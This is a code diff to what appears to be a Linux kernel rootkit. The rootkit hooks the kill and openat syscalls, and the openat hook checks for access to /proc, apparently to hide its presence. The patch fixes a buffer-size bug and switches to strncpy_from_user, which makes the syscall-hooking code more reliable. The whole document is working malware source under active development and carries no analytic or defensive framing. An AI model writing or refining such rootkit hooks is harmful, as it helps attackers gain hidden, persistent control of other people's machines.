@@ -74,24 +74,26 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
 
 static asmlinkage long hook_openat(const struct pt_regs *regs)
 {
-    // Allocate a kernel buffer to store the requested filename
+    // Allocate a kernel buffer to store the requested filename + null terminator
     char *filepath_user = (char *)regs->si;
-    char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
+    char *filepath_kernel = kmalloc(NAME_MAX + 1, GFP_KERNEL);
     if (filepath_kernel == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return orig_openat(regs);
     }
 
     // Copy the requested filename to the kernel mode buffer
-    int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
-    if (err > 0) {
-        ROOTI_DEBUG("copy_from_user() failed: %d", err);
+    int len = strncpy_from_user(filepath_kernel, filepath_user, NAME_MAX);
+    if (len < 0) {
+        ROOTI_DEBUG("strncpy_from_user() failed: %d", len);
         kfree(filepath_kernel);
         return orig_openat(regs);
     }
+    filepath_kernel[NAME_MAX] = '\0';
 
     // Invoke the original syscall
     int fd = orig_openat(regs);
+    int err;
     
     // Check if the requested file to open is the /proc VFS directory
     if (strncmp(filepath_kernel, "/proc", NAME_MAX) == 0) {
